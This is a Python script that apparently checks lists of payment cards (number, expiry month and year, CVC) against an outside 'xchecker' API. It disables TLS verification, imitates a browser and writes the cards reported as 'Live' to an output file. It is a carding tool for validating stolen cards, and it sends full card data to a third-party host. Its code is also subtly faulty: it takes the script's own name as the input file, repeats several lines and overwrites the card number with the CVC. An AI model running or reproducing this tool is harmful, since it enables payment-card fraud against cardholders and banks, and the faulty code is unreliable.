import os, requests, time, urllib3
import sys
from datetime import datetime
from termcolor import colored


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
print("Start check credit card...\n")

ccFile = "cc.txt"
outputFile = "cc_checked_{}.txt".format(int(datetime.timestamp(datetime.now())))

# get output file and input file from command line/ terminal
nArgv = len(sys.argv)
if nArgv > 0:
    ccFile = sys.argv[0]

if nArgv > 1: 
    outputFile = sys.argv[1]

# define api check cc and header
checkerAPIURL = "https://www.xchecker.cc/api.php?cc={}|{}|{}|{}"
headers = { 
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Accept": "*/*",
}
 
def handleOutput(data, file, mode="a"):
    f = open(file, mode)
    
    if "|Live|" in data:
        print(colored(data, "green", attrs=["bold"]))
        f.write("{}\n".format(data)) # write to ouput if cc live
    elif "|Dead|" in data:
        print(colored(data, "red", attrs=["bold"]))
    else:
        print(colored(data, "yellow", attrs=["bold"]))

    f.close()
 
def main():
    if os.path.exists(ccFile):
        with open(ccFile) as f:
            handleOutput("Output file results: {}".format(outputFile), outputFile)
            for cc in f:
                cc = cc.replace("\r", "").replace("\n", "")
                try:
                    ccNumber = cc.split("|")[0]
                    expMonth = cc.split("|")[1]
                    expYear = cc.split("|")[2]
                    cvc = cc.split("|")[3]
                except:
                    handleOutput("{} => Format error. Use ccNumber|expMonth|expYear|cvc".format(cc), outputFile)
                    continue
                url = checkerAPIURL.format(ccNumber, expMonth, expYear, cvc)
                url = checkerAPIURL.format(ccNumber, expMonth, expYear, cvc)
                while True:
                    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
                    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
                    if response.status_code == 200 and "json" in response.headers["Content-Type"]:
                        data = response.json()
                        if "ccNumber" in data:
                            output = data["ccNumber"]
                            if "cvc" in data:
                                output = data["cvc"]
                            if "expMonth" in data:
                                output += "|>|" + data["expMonth"]
                                output += "/" + data ["expYear"]
                            output += " |>| " + data["status"] + " |>| " + data["details"]
                            output += " |>| " + data["bankName"]
                        else:
                            output = "{} => {}".format(ccNumber, data["error"])
                        handleOutput(output, outputFile)
                        break
                    else:
                        handleOutput("HTTP service error: {}, retry...".format(response.status_code), outputFile)
    else:
        print("File {} not found in current directory".format(ccFile))
 
if __name__ == "__main__":
    main()
 
